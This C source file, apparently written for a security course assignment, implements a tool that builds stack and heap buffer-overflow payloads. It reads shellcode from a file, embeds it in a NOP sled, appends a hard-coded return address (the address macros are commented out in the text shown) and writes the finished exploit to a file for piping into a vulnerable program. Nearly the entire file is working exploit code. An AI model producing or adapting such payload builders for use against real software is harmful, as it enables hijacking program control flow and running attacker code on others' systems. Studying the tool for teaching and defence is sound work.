#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#define ARCHITECTURE 64
/* stack overflow address for laptop */
// #define ADDRESS "\x47\xe7\xff\xff\xff\x7f"
/* heap overflow address for laptop */
// #define ADDRESS "\x50\xd8\xff\xff\xff\x7f"

/* Note for future: 264 buffer size for stack, 262 for heap */


void print_usage(void)
{
		puts("usage: create_exploit [-h] BUFFER_SIZE SHELLCODE_FILE OUTPUT_PATH");
		puts("");
		puts("Generates shellcode file to pipe into vulnerable programs.");
		puts("");
		puts("Positional:");
		puts("\tBUFFER_SIZE:\tSize of total buffer for exploit\n\t\t\t(large enough to override RIP/EIP fully).");
		puts("\tSHELLCODE_FILE:\tPath to file that contains shellcode binary.");
		puts("\tOUTPUT_PATH:\tPath to output file that exploit will be written to.");
		puts("");
		puts("Flags:");
		puts("\t-h\tPrint this help output.");
		puts("");
}

int main(int argc, char *argv[])
{
		unsigned int index, buffindex, buffsize, filelen, offset;
		unsigned char *shellpath, *outpath, *shellbuff, *outbuff;
		FILE *shellfile, *outfile;

		/* Argument parsing */
		if (argc < 4 || argc > 4) {
				print_usage();
				return (EXIT_FAILURE);
		}

		for (index = 0; index < (unsigned int)argc; index++) {
				if (strcmp("-h", argv[index]) == 0) {
						print_usage();
						return (EXIT_FAILURE);
				}
				switch (index) {
				case 1:
						buffsize = atoi(argv[index]);
						break;
				case 2:
						shellpath = (unsigned char *)argv[index];
						break;
				case 3:
						outpath = (unsigned char *)argv[index];
						break;
				default:
						break;
				}
		}

		/* Parse in file containing shellcode binary */
		printf("[*] Opening shellcode file from: %s\n", shellpath);
		shellfile = fopen((char *)shellpath, "rb");
		if (!shellfile) {
				perror("[-] Given shellcode file path invalid");
				return (EXIT_FAILURE);
		}

		(void)fseek(shellfile, 0, SEEK_END);
		filelen = ftell(shellfile);
		(void)rewind(shellfile);
		printf("[*] Given shellcode length: %d\n", filelen);

		shellbuff = (unsigned char *)malloc((size_t)filelen * sizeof(char));
		(void)fread(shellbuff, sizeof(char), (size_t)filelen, shellfile);
		(void)fclose(shellfile);

		puts("[+] Shellcode given:");
		for (index = 0; index < filelen; index++) {
				if (index != 0 && index % 16 == 0)
						puts("");
				printf("\\x%02x", shellbuff[index]);
		}
		puts("");

		/* Create NOP sled (and output buffer simulataneously) */
		outbuff = (unsigned char *)malloc(buffsize * sizeof(char));
		(void)memset(outbuff, 0x90, buffsize);
		
		/* Add shellcode into NOP sled output buffer */
		printf("[*] Given buffer length: %d\n", buffsize);
		/* Additional + 2 because of this particular assignment's executable sizes */
		offset = buffsize - filelen - (ARCHITECTURE / 8) + 2;
		printf("[*] Calculated offset for NOP slide: %d\n", offset);
		memcpy(outbuff + offset, shellbuff, filelen);
		puts("[*] Shellcode copied into buffer.");

		/* Add address onto end of exploit */
		/* buffsize - 6 for same reason given above for additional + 2 */
		memcpy(outbuff + buffsize - 6, ADDRESS, 6);

		puts("[+] Final exploit buffer:");
		for (index = 0; index < buffsize; index++) {
				if (index != 0 && index % 16 == 0)
						puts("");
				printf("\\x%02x", outbuff[index]);
		}
		puts("");

		/* Output exploit to file chosen by user */
		outfile = fopen((char *)outpath, "wb+");
		if (!outfile) {
				perror("[-] Given output file path invalid");
				return (EXIT_FAILURE);
		}

		(void)fwrite(outbuff, sizeof(char), buffsize, outfile);
		(void)fclose(outfile);
		puts("[+] Exploit binary written to output file.");

		puts("[+] All done. Happy hacking.");
		return (EXIT_SUCCESS);
}
